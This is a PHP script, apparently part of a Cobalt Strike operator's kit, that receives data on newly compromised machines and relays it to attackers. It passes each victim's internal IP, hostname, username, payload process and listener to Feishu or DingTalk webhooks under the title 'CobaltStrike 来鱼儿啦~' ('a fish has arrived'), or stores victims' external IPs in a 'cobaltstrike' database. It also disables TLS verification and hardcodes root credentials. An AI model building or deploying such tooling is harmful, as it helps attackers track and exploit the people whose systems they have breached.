<?php
function request_by_curl($remote_server, $post_string) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $remote_server);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array ('Content-Type: application/json;charset=utf-8'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_string);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    // 线下环境不用开启curl证书验证, 未调通情况可尝试添加该代码
    curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

if(!isset($_GET['source'])){
    exit();
}

$Attacktime = date('Y-m-d H:i:s');

if($_GET['source'] == 'feishu'){
    $webhook = "https://open.feishu.cn/open-apis/bot/v2/hook/自己钉钉机器人的Token";
    $message="内网IP：".$_GET['internalIP']."\r\n主机名：".$_GET['computerName']."\r\n用户名：".$_GET['userName']."\r\n载荷名：".$_GET['Process']."\r\n监听器：".$_GET['Listener']."\r\n时间戳：".$Attacktime."\r\n";
    $data = array ("msg_type" =>"post","content" => ["post" => ["zh_cn" => ["title" =>"CobaltStrike来鱼儿啦~","content" =>[[["tag" =>"text","text" =>$message]],[["tag" =>"at","user_id" =>"all"]]]]]]);
    $data_string = json_encode($data);
    $result = request_by_curl($webhook, $data_string);
}
if($_GET['source'] == 'dingtalk'){
    $webhook = "https://oapi.dingtalk.com/robot/send?access_token=自己飞书机器人的Token";
    $message="CobaltStrike来鱼儿啦~"."\r\n内网IP：".$_GET['internalIP']."\r\n主机名：".$_GET['computerName']."\r\n用户名：".$_GET['userName']."\r\n载荷名：".$_GET['Process']."\r\n监听器：".$_GET['Listener']."\r\n时间戳：".$Attacktime."\r\n";
    $data = array ('msgtype' => 'text','text' => array ('content' => $message),'at' => array ('isAtAll' => true));
    $data_string = json_encode($data);
    $result = request_by_curl($webhook, $data_string);
}
if($_GET['source'] == 'fish'){
	$mysqli = new mysqli('127.0.0.1','root','root','cobaltstrike');
	$mysqli->query('set names utf8');
	//创建预编译对象
	$mysqli_stmt = $mysqli->prepare("INSERT INTO user (externalIP) VALUES (?)");
	//绑定参数
	$mysqli_stmt->bind_param("s",$_GET['externalIP']);
	$mysqli_stmt->execute();
}
//echo $result;
?>